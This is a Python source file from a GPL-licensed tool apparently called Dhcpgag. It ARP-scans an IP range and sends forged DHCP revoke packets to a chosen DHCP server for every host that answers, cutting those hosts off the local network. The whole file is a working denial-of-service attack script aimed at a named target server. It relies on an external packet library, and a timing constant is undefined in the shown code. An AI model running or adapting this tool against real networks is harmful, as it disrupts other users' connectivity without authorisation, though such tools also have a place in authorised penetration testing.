#!/usr/bin/env python
"""
    Methods for shutting up a dhcp server on your lan intelligently (and optionally resotre it)
    Copyright (C) 2015  Bram Staps (Glasswall B.V.)

    This file is part of Dhcpgag.

    Dhcpgag is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    Dhcpgag is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
"""
import random
import time
from multiprocessing import Process
import struct
import argparse
import sys
sys.path.append("/usr/lib")
from pktgen import *
sys.path.pop()

########################################################################

def arpScanner(startIp, stopIp):
    time.sleep(SNIFF_WAIT)
    while True:
        for ip in ipgen(startIp, stopIp):
            p = mkpktArpWhoHas(ip)
            sendp(p, iface=args.interface, verbose=False)
            time.sleep(dt)
        time.sleep(wait)

########################################################################

def arpHandler(pkt): # we revoke all arp we see
    if pkt.op == 2:
        p = mkpktDhcpRevoke(pkt.hwsrc, pkt.psrc)
        print "revoking: [%s](%s)" % (pkt.hwsrc, pkt.psrc)
        sendp(p, iface=args.interface, verbose=False)

########################################################################

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Arp ping all ip's in a certain range, and revoke them on a specific dhcp server.")
    parser.add_argument("interface", type=str, help="The interface where to search for DHCP servers.")

    parser.add_argument("dhcpmac", type=str, help="The mac address of the dhcp server to attack")
    parser.add_argument("startip", type=str, help="The first ip address of the range to revoke")
    parser.add_argument("stopip", type=str, help="The last ip adress of the range to revoke")

    parser.add_argument("--dt", type=float, help="The time between packets of the arp scanner (Default: 0.01)")
    parser.add_argument("--wait", type=float, help="The time between the cycles of the arp scanner (Default: 30.0)")
    args = parser.parse_args()

    dt = 0.01
    if args.dt: dt = args.dt

    wait = 30.0
    if args.wait: wait = args.wait

    Process(target=arpScanner, args=(args.startip, args.stopip)).start()
    sniff(filter="arp", prn=arpHandler, iface=args.interface)
